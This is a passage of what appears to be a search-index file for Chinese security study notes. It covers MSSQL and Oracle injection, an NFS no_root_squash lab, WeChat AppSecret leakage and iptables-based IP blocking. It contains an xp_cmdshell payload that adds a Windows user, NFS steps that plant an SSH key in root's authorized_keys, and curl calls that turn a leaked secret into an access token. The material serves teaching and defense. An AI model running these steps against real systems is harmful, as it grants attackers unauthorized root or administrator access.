convert(int,'5') \u6570\u636e\u5e93\u7c7b\u578b\u8f6c\u6362 stuff \u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570 ascii \u53d6ascii\u7801 char \u6839\u636eascii\u7801\u53d6\u5b57\u7b26 getdate \u8fd4\u56de\u65e5\u671f count \u8fd4\u56de\u7ec4\u4e2d\u7684\u603b\u6761\u6570 cast \u5c06\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8868\u8fbe\u5f0f\u663e\u5f0f\u8f6c\u6362\u4e3a\u53e6\u4e00\u79cd\u6570\u636e\u7c7b\u578b\u7684\u8868\u8fbe\u5f0f rand \u8fd4\u56de\u968f\u673a\u503c is_srvrolemember \u6307\u793aSQL Server\u767b\u5f55\u540d\u662f\u5426\u4e3a\u6307\u5b9a\u670d\u52a1\u5668\u89d2\u8272\u7684\u6210\u5458","title":"MSSQL\u51fd\u6570"},{"location":"vulnerability/sql_injection/#mssql_2","text":"select * from users where id=1; exec xp_cmdshell 'net user hacker hacker /add'; \u5b58\u50a8\u8fc7\u7a0b \u4f5c\u7528 sp_addlogin \u521b\u5efa\u65b0\u7684SQL Server\u767b\u5f55\uff0c\u8be5\u767b\u5f55\u5141\u8bb8\u7528\u6237\u4f7f\u7528SQL Server\u8eab\u4efd\u9a8c\u8bc1\u8fde\u63a5\u5230SQL Server\u5b9e\u4f8b sp_dropuser \u4ece\u5f53\u524d\u6570\u636e\u5e93\u5220\u9664\u6570\u636e\u5e93\u7528\u6237 xp_enumgroups \u63d0\u4f9bMicrosoft Windows\u672c\u5730\u7ec4\u5217\u8868\u6216\u5728\u6307\u5b9a\u7684Windows\u57df\u4e2d\u5b9a\u4e49\u5168\u5c40\u7ec4\u5217\u8868 xp_regwrite \u672a\u88ab\u516c\u5e03\u7684\u5b58\u50a8\u8fc7\u7a0b\uff0c\u5199\u5165\u6ce8\u518c\u8868 xp_regread \u8bfb\u53d6\u6ce8\u518c\u8868 xp_regdeletevalue \u5220\u9664\u6ce8\u518c\u8868 xp_dirtree \u8bfb\u53d6\u76ee\u5f55 sp_password \u66f4\u6539\u5bc6\u7801 xp_servicecontrol \u505c\u6b62\u6216\u6fc0\u6d3b\u67d0\u670d\u52a1","title":"MSSQL\u5b58\u50a8\u8fc7\u7a0b"},{"location":"vulnerability/sql_injection/#mssql_3","text":"exec\u51fd\u6570\uff1a","title":"MSSQL\u52a8\u6001\u6267\u884c"},{"location":"vulnerability/sql_injection/#oracle","text":"","title":"Oracle\u6ce8\u5165\u8be6\u89e3"},{"location":"vulnerability/sql_injection/#_9","text":"","title":"\u83b7\u53d6\u6570\u636e"},{"location":"vulnerability/sql_injection/#_10","text":"-- \u67e5\u770b\u8868\u7a7a\u95f4 select tablespace_name from user_tablespaces; -- \u67e5\u770b\u6240\u6709\u8868 select table_name from user_tables where rownum=1; -- \u67e5\u770b\u6240\u6709\u5217 select column_name from user_tab_columns where table_name='tab_name'; -- \u67e5\u770b\u6240\u6709\u7528\u6237 select username from all_users;","title":"\u83b7\u53d6\u5143\u6570\u636e"},{"location":"vulnerability/sql_injection/#union_2","text":"union select null,null,null from dual;","title":"union\u67e5\u8be2"},{"location":"vulnerability/sql_injection/#oracle_1","text":"","title":"Oracle\u5305\u6982\u5ff5"},{"location":"vulnerability/sql_injection/#_11","text":"","title":"\u9632\u5fa1\u624b\u6bb5"},{"location":"vulnerability/sql_injection/#_12","text":"","title":"\u8f93\u5165\u8fc7\u6ee4"},{"location":"vulnerability/sql_injection/#_13","text":"","title":"\u68c0\u67e5\u6570\u636e\u7c7b\u578b"},{"location":"vulnerability/sql_injection/#_14","text":"","title":"\u4f7f\u7528\u5b89\u5168\u7684\u51fd\u6570"},{"location":"vulnerability/sql_injection/#_15","text":"\u9632\u5fa1SQL\u6ce8\u5165\u6700\u4f73\u7684\u65b9\u5f0f\u5c31\u662f\u4f7f\u7528\u9884\u7f16\u8bd1\u8bed\u53e5\uff0c\u7ed1\u5b9a\u53d8\u91cf\u3002","title":"\u4f7f\u7528\u9884\u7f16\u8bd1"},{"location":"vulnerability/sql_injection/#_16","text":"\u5b58\u50a8\u8fc7\u7a0b\u4e0e\u9884\u7f16\u8bd1\u7684\u533a\u522b\uff1a\u5b58\u50a8\u8fc7\u7a0b\u9700\u8981\u5148\u5c06SQL\u8bed\u53e5\u5b9a\u4e49\u5728\u6570\u636e\u5e93\u4e2d\u3002","title":"\u4f7f\u7528\u5b89\u5168\u7684\u5b58\u50a8\u8fc7\u7a0b"},{"location":"vulnerability/sql_injection/#_17","text":"\u5b58\u50a8\u8fc7\u7a0b\u5b58\u5728\u88ab\u7ed5\u8fc7\u7684\u53ef\u80fd\u6027\uff1a\u52a8\u6001\u7684SQL\u3001\u5982\uff1axp_cmdshell","title":"\u7ed5\u8fc7\u5b58\u50a8\u8fc7\u7a0b"},{"location":"vulnerability/sql_injection/#_18","text":"","title":"\u4f7f\u7528\u6846\u67b6\u6280\u672f"},{"location":"vulnerability/unauthorized/","text":"\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e \u6f0f\u6d1e\u590d\u73b0 # \u5b89\u88c5nfs\u670d\u52a1 yum install nfs-utils.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start rpcbind.service # \u5982\u679c\u8fd9\u4e2a\u670d\u52a1\u4e0d\u542f\u52a8\uff0cnfs\u670d\u52a1\u4f1a\u542f\u52a8\u5931\u8d25 systemctl start nfs-server.service # \u914d\u7f6e\u670d\u52a1\u5f00\u673a\u81ea\u542f systemctl enable rpcbind.service systemctl enable nfs-server.service # \u5173\u95ed\u9632\u706b\u5899\u6216\u8bbe\u7f6e\u9632\u706b\u5899\u5141\u8bb8nfs\u670d\u52a1\u901a\u8fc7 firewall-cmd --permanent --add-service=nfs firewall-cmd --permanent --add-service=rpc-bind firewall-cmd --permanent --add-service=mountd firewall-cmd --reload # \u914d\u7f6enfs echo '/ *(rw,sync,no_root_squash)' /etc/exports # \u542f\u52a8\u5171\u4eab exportfs -r # \u67e5\u770b\u5171\u4eab showmount -e # \u5ba2\u6237\u7aef\u6302\u8f7d\uff0c\u6302\u8f7d\u5230\u672c\u5730\u7684/tmp/test\u8def\u5f84 mount -t nfs server_ip:/ /tmp/test \u5bf9NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528 # \u626b\u63cf\u670d\u52a1\u5668IP rpcinfo -p server_ip # \u67e5\u770bnfs\u6302\u8f7d showmount -e server_ip # \u914d\u7f6essh\u6c38\u4e45\u8fde\u63a5 mount -t nfs server_ip:/ /tmp/test ssh-keygen cat ~/.ssh/id_rsa.pub /tmp/test/root/.ssh/autorized_keys ssh root@server_ip \u6f0f\u6d1e\u5206\u6790 /etc/exports\u6587\u4ef6\u683c\u5f0f \u8f93\u51fa\u76ee\u5f55 [\u5ba2\u6237\u7aef1 \u9009\u9879\uff08\u8bbf\u95ee\u6743\u9650,\u7528\u6237\u6620\u5c04,\u5176\u4ed6\uff09] [\u5ba2\u6237\u7aef2 \u9009\u9879\uff08\u8bbf\u95ee\u6743\u9650,\u7528\u6237\u6620\u5c04,\u5176\u4ed6\uff09] \u8f93\u51fa\u76ee\u5f55 \u9700\u8981\u5171\u4eab\u7ed9\u5ba2\u6237\u7aef\u4f7f\u7528\u7684\u76ee\u5f55\u3002 \u5ba2\u6237\u7aef \u7f51\u6bb5\u6216\u5355\u4e2aIP\u5747\u53ef:10.10.10.0/24 \u9009\u578b \u8bbe\u7f6e\u8f93\u51fa\u76ee\u5f55\u53ea\u8bfb\uff1aro \u8bbe\u7f6e\u8f93\u51fa\u76ee\u5f55\u8bfb\u5199\uff1arw \u7528\u6237\u6620\u5c04 all_squash\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u666e\u901a\u7528\u6237\u53ca\u6240\u5c5e\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u6216\u7528\u6237\u7ec4(nfsnobody)\uff1b no_all_squash\uff1a\u4e0eall_squash\u53d6\u53cd(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b root_squash\uff1a\u5c06root\u7528\u6237\u53ca\u6240\u5c5e\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u6216\u7528\u6237\u7ec4(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b no_root_squash\uff1a\u4e0eroot_squash\u53d6\u53cd\uff1b anonuid=xxx\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u7528\u6237\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\uff0c\u5e76\u6307\u5b9a\u8be5\u7528\u6237\u4e3a\u672c\u5730\u7528\u6237(UID=xxx)\uff1b anongid=xxx\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u7528\u6237\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u7ec4\u8d26\u6237\uff0c\u5e76\u6307\u5b9a\u8be5\u533f\u540d\u7528\u6237\u7ec4\u8d26\u6237\u4e3a\u672c\u5730\u7528\u6237\u7ec4\u8d26\u6237(GID=xxx)\uff1b \u5176\u5b83\u9009\u9879 secure\uff1a\u9650\u5236\u5ba2\u6237\u7aef\u53ea\u80fd\u4ece\u5c0f\u4e8e1024\u7684tcp/ip\u7aef\u53e3\u8fde\u63a5nfs\u670d\u52a1\u5668\uff08\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff1b insecure\uff1a\u5141\u8bb8\u5ba2\u6237\u7aef\u4ece\u5927\u4e8e1024\u7684tcp/ip\u7aef\u53e3\u8fde\u63a5\u670d\u52a1\u5668\uff1b sync\uff1a\u5c06\u6570\u636e\u540c\u6b65\u5199\u5165\u5185\u5b58\u7f13\u51b2\u533a\u4e0e\u78c1\u76d8\u4e2d\uff0c\u6548\u7387\u4f4e\uff0c\u4f46\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\uff1b async\uff1a\u5c06\u6570\u636e\u5148\u4fdd\u5b58\u5728\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\uff0c\u5fc5\u8981\u65f6\u624d\u5199\u5165\u78c1\u76d8\uff1b wdelay\uff1a\u68c0\u67e5\u662f\u5426\u6709\u76f8\u5173\u7684\u5199\u64cd\u4f5c\uff0c\u5982\u679c\u6709\u5219\u5c06\u8fd9\u4e9b\u5199\u64cd\u4f5c\u4e00\u8d77\u6267\u884c\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\uff08\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff1b no_wdelay\uff1a\u82e5\u6709\u5199\u64cd\u4f5c\u5219\u7acb\u5373\u6267\u884c\uff0c\u5e94\u4e0esync\u914d\u5408\u4f7f\u7528\uff1b subtree\uff1a\u82e5\u8f93\u51fa\u76ee\u5f55\u662f\u4e00\u4e2a\u5b50\u76ee\u5f55\uff0c\u5219nfs\u670d\u52a1\u5668\u5c06\u68c0\u67e5\u5176\u7236\u76ee\u5f55\u7684\u6743\u9650(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b no_subtree\uff1a\u5373\u4f7f\u8f93\u51fa\u76ee\u5f55\u662f\u4e00\u4e2a\u5b50\u76ee\u5f55\uff0cnfs\u670d\u52a1\u5668\u4e5f\u4e0d\u68c0\u67e5\u5176\u7236\u76ee\u5f55\u7684\u6743\u9650\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\uff1b \u53c2\u8003\u8d44\u6599 \u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3","title":"\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"vulnerability/unauthorized/#_1","text":"","title":"\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"vulnerability/unauthorized/#nfs","text":"","title":"NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e"},{"location":"vulnerability/unauthorized/#_2","text":"# \u5b89\u88c5nfs\u670d\u52a1 yum install nfs-utils.x86_64 -y # \u542f\u52a8\u670d\u52a1 systemctl start rpcbind.service # \u5982\u679c\u8fd9\u4e2a\u670d\u52a1\u4e0d\u542f\u52a8\uff0cnfs\u670d\u52a1\u4f1a\u542f\u52a8\u5931\u8d25 systemctl start nfs-server.service # \u914d\u7f6e\u670d\u52a1\u5f00\u673a\u81ea\u542f systemctl enable rpcbind.service systemctl enable nfs-server.service # \u5173\u95ed\u9632\u706b\u5899\u6216\u8bbe\u7f6e\u9632\u706b\u5899\u5141\u8bb8nfs\u670d\u52a1\u901a\u8fc7 firewall-cmd --permanent --add-service=nfs firewall-cmd --permanent --add-service=rpc-bind firewall-cmd --permanent --add-service=mountd firewall-cmd --reload # \u914d\u7f6enfs echo '/ *(rw,sync,no_root_squash)' /etc/exports # \u542f\u52a8\u5171\u4eab exportfs -r # \u67e5\u770b\u5171\u4eab showmount -e # \u5ba2\u6237\u7aef\u6302\u8f7d\uff0c\u6302\u8f7d\u5230\u672c\u5730\u7684/tmp/test\u8def\u5f84 mount -t nfs server_ip:/ /tmp/test","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"vulnerability/unauthorized/#nfs_1","text":"# \u626b\u63cf\u670d\u52a1\u5668IP rpcinfo -p server_ip # \u67e5\u770bnfs\u6302\u8f7d showmount -e server_ip # \u914d\u7f6essh\u6c38\u4e45\u8fde\u63a5 mount -t nfs server_ip:/ /tmp/test ssh-keygen cat ~/.ssh/id_rsa.pub /tmp/test/root/.ssh/autorized_keys ssh root@server_ip","title":"\u5bf9NFS\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u8fdb\u884c\u5229\u7528"},{"location":"vulnerability/unauthorized/#_3","text":"/etc/exports\u6587\u4ef6\u683c\u5f0f \u8f93\u51fa\u76ee\u5f55 [\u5ba2\u6237\u7aef1 \u9009\u9879\uff08\u8bbf\u95ee\u6743\u9650,\u7528\u6237\u6620\u5c04,\u5176\u4ed6\uff09] [\u5ba2\u6237\u7aef2 \u9009\u9879\uff08\u8bbf\u95ee\u6743\u9650,\u7528\u6237\u6620\u5c04,\u5176\u4ed6\uff09]","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"vulnerability/unauthorized/#_4","text":"\u9700\u8981\u5171\u4eab\u7ed9\u5ba2\u6237\u7aef\u4f7f\u7528\u7684\u76ee\u5f55\u3002","title":"\u8f93\u51fa\u76ee\u5f55"},{"location":"vulnerability/unauthorized/#_5","text":"\u7f51\u6bb5\u6216\u5355\u4e2aIP\u5747\u53ef:10.10.10.0/24","title":"\u5ba2\u6237\u7aef"},{"location":"vulnerability/unauthorized/#_6","text":"\u8bbe\u7f6e\u8f93\u51fa\u76ee\u5f55\u53ea\u8bfb\uff1aro \u8bbe\u7f6e\u8f93\u51fa\u76ee\u5f55\u8bfb\u5199\uff1arw","title":"\u9009\u578b"},{"location":"vulnerability/unauthorized/#_7","text":"all_squash\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u666e\u901a\u7528\u6237\u53ca\u6240\u5c5e\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u6216\u7528\u6237\u7ec4(nfsnobody)\uff1b no_all_squash\uff1a\u4e0eall_squash\u53d6\u53cd(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b root_squash\uff1a\u5c06root\u7528\u6237\u53ca\u6240\u5c5e\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u6216\u7528\u6237\u7ec4(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b no_root_squash\uff1a\u4e0eroot_squash\u53d6\u53cd\uff1b anonuid=xxx\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u7528\u6237\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\uff0c\u5e76\u6307\u5b9a\u8be5\u7528\u6237\u4e3a\u672c\u5730\u7528\u6237(UID=xxx)\uff1b anongid=xxx\uff1a\u5c06\u8fdc\u7a0b\u8bbf\u95ee\u7684\u6240\u6709\u7528\u6237\u7ec4\u90fd\u6620\u5c04\u4e3a\u533f\u540d\u7528\u6237\u7ec4\u8d26\u6237\uff0c\u5e76\u6307\u5b9a\u8be5\u533f\u540d\u7528\u6237\u7ec4\u8d26\u6237\u4e3a\u672c\u5730\u7528\u6237\u7ec4\u8d26\u6237(GID=xxx)\uff1b","title":"\u7528\u6237\u6620\u5c04"},{"location":"vulnerability/unauthorized/#_8","text":"secure\uff1a\u9650\u5236\u5ba2\u6237\u7aef\u53ea\u80fd\u4ece\u5c0f\u4e8e1024\u7684tcp/ip\u7aef\u53e3\u8fde\u63a5nfs\u670d\u52a1\u5668\uff08\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff1b insecure\uff1a\u5141\u8bb8\u5ba2\u6237\u7aef\u4ece\u5927\u4e8e1024\u7684tcp/ip\u7aef\u53e3\u8fde\u63a5\u670d\u52a1\u5668\uff1b sync\uff1a\u5c06\u6570\u636e\u540c\u6b65\u5199\u5165\u5185\u5b58\u7f13\u51b2\u533a\u4e0e\u78c1\u76d8\u4e2d\uff0c\u6548\u7387\u4f4e\uff0c\u4f46\u53ef\u4ee5\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\uff1b async\uff1a\u5c06\u6570\u636e\u5148\u4fdd\u5b58\u5728\u5185\u5b58\u7f13\u51b2\u533a\u4e2d\uff0c\u5fc5\u8981\u65f6\u624d\u5199\u5165\u78c1\u76d8\uff1b wdelay\uff1a\u68c0\u67e5\u662f\u5426\u6709\u76f8\u5173\u7684\u5199\u64cd\u4f5c\uff0c\u5982\u679c\u6709\u5219\u5c06\u8fd9\u4e9b\u5199\u64cd\u4f5c\u4e00\u8d77\u6267\u884c\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\uff08\u9ed8\u8ba4\u8bbe\u7f6e\uff09\uff1b no_wdelay\uff1a\u82e5\u6709\u5199\u64cd\u4f5c\u5219\u7acb\u5373\u6267\u884c\uff0c\u5e94\u4e0esync\u914d\u5408\u4f7f\u7528\uff1b subtree\uff1a\u82e5\u8f93\u51fa\u76ee\u5f55\u662f\u4e00\u4e2a\u5b50\u76ee\u5f55\uff0c\u5219nfs\u670d\u52a1\u5668\u5c06\u68c0\u67e5\u5176\u7236\u76ee\u5f55\u7684\u6743\u9650(\u9ed8\u8ba4\u8bbe\u7f6e)\uff1b no_subtree\uff1a\u5373\u4f7f\u8f93\u51fa\u76ee\u5f55\u662f\u4e00\u4e2a\u5b50\u76ee\u5f55\uff0cnfs\u670d\u52a1\u5668\u4e5f\u4e0d\u68c0\u67e5\u5176\u7236\u76ee\u5f55\u7684\u6743\u9650\uff0c\u8fd9\u6837\u53ef\u4ee5\u63d0\u9ad8\u6548\u7387\uff1b","title":"\u5176\u5b83\u9009\u9879"},{"location":"vulnerability/unauthorized/#_9","text":"\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u603b\u7ed3","title":"\u53c2\u8003\u8d44\u6599"},{"location":"vulnerability/weixin_appsecret/","text":"\u5fae\u4fe1APPId\u4e0eAPPSecret\u6cc4\u6f0f # \u83b7\u53d6token curl https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential appid=APPID secret=APPSECRET # \u67e5\u8be2\u6240\u6709\u5206\u7ec4 curl https://api.weixin.qq.com/cgi-bin/groups/get?access_token=ACCESS_TOKEN \u4e0d\u4f7f\u7528\u547d\u4ee4\u884c\u7684\u57fa\u7840\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\uff1a \u5fae\u4fe1\u516c\u4f17\u5e73\u53f0\u63a5\u53e3\u8c03\u8bd5\u5de5\u5177","title":"\u5fae\u4fe1APPId\u4e0eAPPSecret\u6cc4\u6f0f"},{"location":"vulnerability/weixin_appsecret/#appidappsecret","text":"# \u83b7\u53d6token curl https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential appid=APPID secret=APPSECRET # \u67e5\u8be2\u6240\u6709\u5206\u7ec4 curl https://api.weixin.qq.com/cgi-bin/groups/get?access_token=ACCESS_TOKEN \u4e0d\u4f7f\u7528\u547d\u4ee4\u884c\u7684\u57fa\u7840\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5b98\u7f51\u63d0\u4f9b\u7684\u5de5\u5177\uff1a \u5fae\u4fe1\u516c\u4f17\u5e73\u53f0\u63a5\u53e3\u8c03\u8bd5\u5de5\u5177","title":"\u5fae\u4fe1APPId\u4e0eAPPSecret\u6cc4\u6f0f"},{"location":"waf/iptables_waf/","text":"\u57fa\u4e8eiptables\u5b9e\u73b0waf iptables\u5de5\u4f5c\u5728\u4e3b\u673a\u5c42\u9762\uff0c\u5bf9\u4e8e\u8fdb\u51fa\u7684\u7f51\u7edc\u6216\u8005\u4e3b\u673a\u7684\u6570\u636e\u62a5\u6587\uff0c\u6839\u636e\u4e8b\u5148\u8bbe\u5b9a\u597d\u7684\u68c0\u67e5\u89c4\u5219\u5bf9\u5176\u68c0\u67e5\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002 iptables\u4f7f\u7528\u6848\u4f8b # \u62e6\u622aip iptables -A INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP # \u5220\u9664\u62e6\u622a iptables -D INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP ipset\u5b9e\u73b0\u6279\u91cf\u62e6\u622a # \u521b\u5efaip\u96c6 ipset create bloodzer0 hash:ip # \u67e5\u770bip\u96c6 ipset list # \u6dfb\u52a0\u6210\u5458 ipset add bloodzer0 ip # \u5220\u9664\u6210\u5458 ipset del bloodzer0 ip # \u5c06ipset\u4fdd\u5b58\u4e3a\u6587\u4ef6 ipset save bloodzer0 -f bloodzer0.txt # iptables\u4e0eipset\u7ed3\u5408 iptables -A INPUT -m set --match-set bloodzer0 src -p tcp --dport 80 -j DROP \u8e29\u5751 \u5c01\u7981\u76f4\u8fdeIP\u7684\u98ce\u9669 iptables\u5c01\u7981IP\uff0c\u662f\u5c01\u7981\u7684\u76f4\u8fdeIP\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4e0e\u670d\u52a1\u5668\u901a\u4fe1\u7684IP\u3002\u4f46\u662f\u6211\u4eec\u4e00\u822c\u7684\u7f51\u7edc\u67b6\u6784\u662f\uff1aCDN--SLB--Server\u6216\u8005CDN--Server\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u7684\u65b9\u5f0f\u5c31\u5931\u6548\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u91c7\u7528\u65b0\u7684\u65b9\u5f0f\uff1a\u6839\u636eXFF\u6765\u5c01\u7981IP\u3002 iptables -A INPUT -p tcp --dport 80 -m string --algo kmp --string X-Forwarded-For: IP -j DROP \u5f53\u7136\uff0cXFF\u5f88\u597d\u4f2a\u9020\uff0c\u9700\u8981\u7ed3\u5408Nginx\u3001CDN\u5404\u5c42\u4e4b\u95f4\u7684\u914d\u7f6e\u4f7f\u7528XFF\u83b7\u53d6\u7528\u6237\u771f\u5b9e\u7684IP\u3002 XFF+iptables\u5b9e\u73b0waf\u6027\u80fd\u74f6\u9888 \u7531\u4e8e\u6839\u636eXFF\u62e6\u622a\u8fd9\u79cd\u65b9\u5f0f\u5c31\u4e0d\u80fd\u4f7f\u7528ipset\uff0c\u6240\u4ee5\u5982\u679c\u662f\u4e1a\u52a1\u91cf\u5f88\u5927\u7684\u65f6\u5019\uff0c\u4e0d\u5efa\u8bae\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u56e0\u4e3a\u4e00\u4e2aIP\u4e00\u6761\u89c4\u5219\uff0c\u800ciptables\u4f1a\u9488\u5bf9INPUT\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u8fdb\u884c\u89e3\u6790\u5224\u65ad\u3002 \u6d4b\u8bd5\u8fc7\u4e00\u53f02\u683816G\u7684\u670d\u52a1\u5668\uff0c\u5728\u89c4\u5219\u6570\u91cf\u8fbe\u52302300+\u7684\u65f6\u5019\uff0cQPS\u7a0d\u5fae\u4e00\u5927\uff0c\u670d\u52a1\u5668CPU\u5bb9\u6613\u98d9\u523090%\u4ee5\u4e0a\u3002","title":"\u57fa\u4e8eiptables\u5b9e\u73b0waf"},{"location":"waf/iptables_waf/#iptableswaf","text":"iptables\u5de5\u4f5c\u5728\u4e3b\u673a\u5c42\u9762\uff0c\u5bf9\u4e8e\u8fdb\u51fa\u7684\u7f51\u7edc\u6216\u8005\u4e3b\u673a\u7684\u6570\u636e\u62a5\u6587\uff0c\u6839\u636e\u4e8b\u5148\u8bbe\u5b9a\u597d\u7684\u68c0\u67e5\u89c4\u5219\u5bf9\u5176\u68c0\u67e5\uff0c\u5e76\u4f5c\u51fa\u76f8\u5e94\u7684\u5904\u7406\u3002","title":"\u57fa\u4e8eiptables\u5b9e\u73b0waf"},{"location":"waf/iptables_waf/#iptables","text":"# \u62e6\u622aip iptables -A INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP # \u5220\u9664\u62e6\u622a iptables -D INPUT -p tcp --dport 80 -s 192.168.199.1 -j DROP","title":"iptables\u4f7f\u7528\u6848\u4f8b"},{"location":"waf/iptables_waf/#ipset","text":"# \u521b\u5efaip\u96c6 ipset create bloodzer0 hash:ip # \u67e5\u770bip\u96c6 ipset list # \u6dfb\u52a0\u6210\u5458 ipset add bloodzer0 ip # \u5220\u9664\u6210\u5458 ipset del bloodzer0 ip # \u5c06ipset\u4fdd\u5b58\u4e3a\u6587\u4ef6 ipset save bloodzer0 -f bloodzer0.txt # iptables\u4e0eipset\u7ed3\u5408 iptables -A INPUT -m set --match-set bloodzer0 src -p tcp --dport 80 -j DROP","title":"ipset\u5b9e\u73b0\u6279\u91cf\u62e6\u622a"},{"location":"waf/iptables_waf/#_1","text":"","title":"\u8e29\u5751"},{"location":"waf/iptables_waf/#ip","text":"iptables\u5c01\u7981IP\uff0c\u662f\u5c01\u7981\u7684\u76f4\u8fdeIP\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4e0e\u670d\u52a1\u5668\u901a\u4fe1\u7684IP\u3002\u4f46\u662f\u6211\u4eec\u4e00\u822c\u7684\u7f51\u7edc\u67b6\u6784\u662f\uff1aCDN--SLB--Server\u6216\u8005CDN--Server\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u4f7f\u7528\u4e0a\u9762\u7684\u65b9\u5f0f\u5c31\u5931\u6548\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u91c7\u7528\u65b0\u7684\u65b9\u5f0f\uff1a\u6839\u636eXFF\u6765\u5c01\u7981IP\u3002 iptables -A INPUT -p tcp --dport 80 -m string --algo kmp --string X-Forwarded-For: IP -j DROP \u5f53\u7136\uff0cXFF\u5f88\u597d\u4f2a\u9020\uff0c\u9700\u8981\u7ed3\u5408Nginx\u3001CDN\u5404\u5c42\u4e4b\u95f4\u7684\u914d\u7f6e\u4f7f\u7528XFF\u83b7\u53d6\u7528\u6237\u771f\u5b9e\u7684IP\u3002","title":"\u5c01\u7981\u76f4\u8fdeIP\u7684\u98ce\u9669"},{"location":"waf/iptables_waf/#xffiptableswaf","text":"\u7531\u4e8e\u6839\u636eXFF\u62e6\u622a\u8fd9\u79cd\u65b9\u5f0f\u5c31\u4e0d\u80fd\u4f7f\u7528ipset\uff0c\u6240\u4ee5\u5982\u679c\u662f\u4e1a\u52a1\u91cf\u5f88\u5927\u7684\u65f6\u5019\uff0c\u4e0d\u5efa\u8bae\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\uff0c\u56e0\u4e3a\u4e00\u4e2aIP\u4e00\u6761\u89c4\u5219\uff0c\u800ciptables\u4f1a\u9488\u5bf9INPUT\u6bcf\u4e00\u4e2a\u6570\u636e\u5305\u8fdb\u884c\u89e3\u6790\u5224\u65ad\u3002 \u6d4b\u8bd5\u8fc7\u4e00\u53f02\u683816G\u7684\u670d\u52a1\u5668\uff0c\u5728\u89c4\u5219\u6570\u91cf\u8fbe\u52302300+\u7684\u65f6\u5019\uff0cQPS\u7a0d\u5fae\u4e00\u5927\uff0c\u670d\u52a1\u5668CPU\u5bb9\u6613\u98d9\u523090%\u4ee5\u4e0a\u3002","title":"XFF+iptables\u5b9e\u73b0waf\u6027\u80fd\u74f6\u9888"}]}